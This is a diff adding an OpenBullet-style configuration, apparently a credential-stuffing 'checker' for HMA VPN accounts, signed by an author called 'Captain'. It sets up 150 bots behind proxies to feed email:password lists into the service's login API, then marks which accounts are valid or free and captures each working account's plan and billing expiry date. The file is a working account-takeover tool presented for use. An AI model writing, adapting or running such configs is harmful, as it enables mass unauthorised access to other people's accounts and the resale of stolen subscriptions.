@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "HMA - Capture Plan",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-26T08:31:56.4029017-05:00",
+  "AdditionalInfo": "Don't hate, appreciate!",
+  "Author": "Captain",
+  "Version": "1.2.6.4 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://securenetconnection.com/clapi/v1.5/user/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Login2 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username/password combination" 
+  KEYCHAIN Success OR 
+    KEY "\"user\":" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"plan\":\"\"" 
+
+#Nama PARSE "<SOURCE>" LR "user\":\"" "\"" -> CAP "Username" 
+
+#Plan PARSE "<SOURCE>" LR "plan\":\"" "\"" -> CAP "Plan" 
+
+#Billing PARSE "<SOURCE>" LR "\"expires\":\"" "T" -> CAP "Next Billing" 
+
+#Insert FUNCTION URLEncode "<USER>:<PASS>" -> VAR "Combo" 
+
+#Cap FUNCTION URLEncode "<Next Billing> | <Plan>" -> VAR "Capture" 
+
